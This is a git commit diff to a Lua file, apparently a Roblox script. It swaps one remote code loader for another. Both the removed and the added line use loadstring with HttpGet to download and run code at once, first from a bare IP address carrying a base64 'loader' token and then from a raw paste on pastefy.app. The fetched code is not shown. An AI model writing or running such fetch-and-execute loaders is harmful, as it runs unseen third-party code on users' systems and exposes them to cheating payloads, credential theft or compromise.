e810c87c2ca5a9503a2894f3a7bbd5b02197e43e
voxiumhub <ticarto092@gmail.com>
2026-02-28 14:00:16 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6ImRlOTBjYTNmLTRjNWEtNDUyZC04MGE1LTE4NTg2MmEwMzBmNSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+loadstring(game:HttpGet("https://pastefy.app/sNUtmAMX/raw"))()
